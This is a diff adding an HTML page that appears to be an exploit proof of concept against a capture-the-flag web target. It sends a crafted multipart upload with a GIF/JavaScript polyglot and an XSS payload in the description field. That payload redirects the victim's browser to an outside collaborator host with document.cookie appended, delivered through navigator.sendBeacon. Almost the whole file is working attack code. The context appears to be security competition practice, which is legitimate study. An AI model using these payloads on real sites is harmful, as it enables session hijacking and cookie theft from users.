@@ -1,0 +1,31 @@
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <script>
+      function submitRequest()
+      {
+        var url = "https:\/\/index.onlysecrets.flu.xxx\/api\/image\/thisismytestpayload";
+
+        var body = "-----------------------------309085703532381991481288763737\r\n" +
+        "Content-Disposition: form-data; name=\"file1\"; filename=\"pink-gerbera-flower-widescreen.jpg\"\r\n" +
+        "Content-Type: image/png\r\n" +
+        "\r\n" +
+        "GIF89a/*\x3csvg/onload=alert(1)\x3e*/=alert(document.domain)//;\r\n" +
+        "-----------------------------309085703532381991481288763737\r\n" +
+        "Content-Disposition: form-data; name=\"description\"\r\n" +
+        "\r\n" +
+        "\x3caudio src/onerror=window.location=\'https://{REDACTED}/collaborator/\'+document.cookie\x3e\r\n" +
+        "-----------------------------309085703532381991481288763737--";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+
+        var status = navigator.sendBeacon(url, new Blob([aBody]));
+
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
